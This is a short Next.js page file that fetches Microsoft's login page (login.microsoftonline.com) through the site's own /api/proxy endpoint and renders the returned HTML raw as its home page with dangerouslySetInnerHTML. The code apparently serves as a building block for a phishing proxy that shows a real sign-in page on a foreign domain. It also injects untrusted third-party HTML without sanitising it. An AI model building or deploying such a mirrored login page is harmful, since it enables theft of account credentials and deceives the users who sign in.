export async function getServerSideProps(context) {
    const url = `http://${context.req.headers.host}/api/proxy?url=https://login.microsoftonline.com/`;

    const res = await fetch(url);
    const text = await res.text();

    return {
        props: {
            content: text
        }
    };
}

export default function Home({ content }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: content }} />
    );
}
